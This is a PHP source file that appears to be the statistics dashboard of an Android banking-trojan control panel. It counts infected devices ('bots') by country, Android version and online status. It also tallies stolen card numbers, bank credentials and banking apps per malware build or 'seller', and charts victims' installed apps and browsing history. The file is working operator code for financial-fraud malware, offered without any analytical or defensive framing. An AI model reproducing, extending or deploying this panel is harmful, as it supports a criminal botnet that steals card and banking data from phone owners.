<?php session_start();
include '../db.php';
if (!(isset($_SESSION['user_id']))) 
{
header("Location: ../index.php");  
return;
}  
?>
<?php
$html = '';
$myData_ar = array();
$mylabel_ar = array();
$myData_html = '';
$mylabel_html = '';

$query = "SELECT * FROM `kliets` WHERE 1";    
$result = $mysqli->query($query);
$count = $result->num_rows;

$distinct_sql = "SELECT DISTINCT `country` FROM `kliets` WHERE 1";
$distinct_sql_res = $mysqli->query($distinct_sql);
while ($country = $distinct_sql_res->fetch_assoc()) {
    array_push($mylabel_ar, $country["country"]);
}

foreach ($mylabel_ar as $country) {
    $all_in_country_sql = "SELECT * FROM `kliets` WHERE `country` = '$country'";
    $all_in_country_res = $mysqli->query($all_in_country_sql);
    array_push($myData_ar, $all_in_country_res->num_rows);

    $myData_html .= "['$country - $all_in_country_res->num_rows', $all_in_country_res->num_rows],";
    #$mylabel_html .= "";

}

$myData_html = rtrim($myData_html, ",");
#$mylabel_html = rtrim($mylabel_html, ",");


$distinct_cards_sql = "SELECT DISTINCT `CARD` FROM `cc_info` WHERE 1";
$distinct_cards_sql_res = $mysqli->query($distinct_cards_sql);
$all_cards_count = $distinct_cards_sql_res->num_rows;

$distinct_banks_sql = "SELECT * FROM `kliets` WHERE `info` != ''";
$distinct_banks_sql_res = $mysqli->query($distinct_banks_sql);
$all_bank_count = $distinct_banks_sql_res->num_rows;

$distinct_bank_apps_sql = "SELECT * FROM `kliets` WHERE `bank` != ''";
$distinct_bank_apps_sql_res = $mysqli->query($distinct_bank_apps_sql);
$bank_apps_count = $distinct_bank_apps_sql_res->num_rows;

$online_date = date('Y-m-d H');
$get_online_sql = "SELECT * FROM `kliets` WHERE `lastConnect` REGEXP '$online_date' ORDER BY `lastConnect` DESC ";
$get_online_sql_res = $mysqli->query($get_online_sql);
$online_bots = $get_online_sql_res->num_rows;
$offline_bots = $count-$online_bots;


#android versions
foreach ([4, 5, 6, 7] as $ver) {
    $andriod_ver_sql = "SELECT * FROM `kliets` WHERE `version` REGEXP '$ver.[0-9](\\.[0-9])?' ORDER BY `version` DESC ";
    $andriod_ver_sql_res = $mysqli->query($andriod_ver_sql);
    $andriod_ver_count = $andriod_ver_sql_res->num_rows;

    # code...
    $android_ver_html .= "['Android$ver - $andriod_ver_count',  $andriod_ver_count],";
}
$android_ver_html = rtrim($android_ver_html, ",");


# Get sellers statistics
$versions_ar = array();

$get_apk_versions_sql = "SELECT DISTINCT `kliets`.`version_apk` FROM `kliets` ORDER BY `kliets`.`version_apk` DESC ";
$get_apk_versions_sql_res = $mysqli->query($get_apk_versions_sql);
while ($version = $get_apk_versions_sql_res->fetch_assoc()) {
    array_push($versions_ar, $version["version_apk"]);
}
$all_sl_names = "";
$all_sl_cards_count = "";
$all_sl_bank_count = "";
$bank_sl_apps_count = "";
foreach ($versions_ar as $seller) {
    if ($seller == '') continue;
    $seller = rtrim($seller);
    $all_sl_names .= ", '$seller'";

    $seller_total_sql = "SELECT * FROM `kliets` WHERE `version_apk` REGEXP '$seller'";
    $seller_total_sql_res = $mysqli->query($seller_total_sql);
    $seller_total_sql_count .= ", $seller_total_sql_res->num_rows";

    $distinct_sl_cards_sql = "SELECT DISTINCT `cc_info`.`CARD` FROM `cc_info` JOIN `kliets` ON `kliets`.`IMEI` = `cc_info`.`IMEI` WHERE `kliets`.`version_apk` REGEXP '$seller'";
    $distinct_sl_cards_sql_res = $mysqli->query($distinct_sl_cards_sql);
    $all_sl_cards_count .= ", $distinct_sl_cards_sql_res->num_rows";

    $distinct_sl_banks_sql = "SELECT * FROM `kliets` WHERE `info` != '' AND `version_apk` REGEXP '$seller'";
    $distinct_sl_banks_sql_res = $mysqli->query($distinct_sl_banks_sql);
    $all_sl_bank_count .= ", $distinct_sl_banks_sql_res->num_rows";

    $distinct_sl_bank_apps_sql = "SELECT * FROM `kliets` WHERE `bank` != '' AND `version_apk` REGEXP '$seller'";
    $distinct_sl_bank_apps_sql_res = $mysqli->query($distinct_sl_bank_apps_sql);
    $bank_sl_apps_count .= ", $distinct_sl_bank_apps_sql_res->num_rows";
}
$bar_chars_sellers_html = "['Stat' $all_sl_names],['Total bots' $seller_total_sql_count],['Cards' $all_sl_cards_count],['Banks' $all_sl_bank_count],['BankApps' $bank_sl_apps_count],";


# Get apps chart
$get_top_apps_sql = "SELECT * FROM `stat_apps` ORDER BY `count` DESC LIMIT 30";
$get_top_apps_sql_res = $mysqli->query($get_top_apps_sql);
if ($get_top_apps_sql_res){
    while ($app = $get_top_apps_sql_res->fetch_assoc()) {
        $app_name = $app["app_name"];
        $app_count = $app["count"];
        $apps_chart_names .= ", '$app_name'";
        $apps_chart_counts .= ", $app_count";
    }
}
$bar_chars_apps_html = "['Stat' $apps_chart_names],['Total' $apps_chart_counts],";

# Get hist chart
$get_top_hist_sql = "SELECT * FROM `stat_hist` ORDER BY `count` DESC LIMIT 30";
$get_top_hist_sql_res = $mysqli->query($get_top_hist_sql);
if ($get_top_hist_sql_res){
    while ($hist = $get_top_hist_sql_res->fetch_assoc()) {
        $hist_name = $hist["domain"];
        $hist_count = $hist["count"];
        $hist_chart_names .= ", '$hist_name'";
        $hist_chart_counts .= ", $hist_count";
    }
}
$bar_chars_hist_html = "['Stat' $hist_chart_names],['Total hits' $hist_chart_counts],";


$html = file_get_contents("templates/botsonline.tpl");
$html = str_replace('%%PLACE_TOTAL_BOTS_COUNT%%', $count, $html);
$html = str_replace('%%PLACE_MYDATA_HERE%%', $myData_html, $html);
$html = str_replace('%%PLACE_CARDS_HERE%%', $all_cards_count, $html);
$html = str_replace('%%PLACE_BANKS_HERE%%', $all_bank_count, $html);

$html = str_replace('%%PLACE_ONLINE_HERE%%', $online_bots, $html);
$html = str_replace('%%PLACE_OFFLINE_HERE%%', $offline_bots, $html);
$html = str_replace('%%PLACE_BANK_APPS_HERE%%', $bank_apps_count, $html);

$html = str_replace('%%PLACE_ANDROID_VER_HERE%%', $android_ver_html, $html);

$html = str_replace('%%PLACE_SELLERS_CHART_HERE%%', $bar_chars_sellers_html, $html);
$html = str_replace('%%PLACE_APPS_CHART_HERE%%', $bar_chars_apps_html, $html);
$html = str_replace('%%PLACE_HIST_CHART_HERE%%', $bar_chars_hist_html, $html);

echo $html;

?>


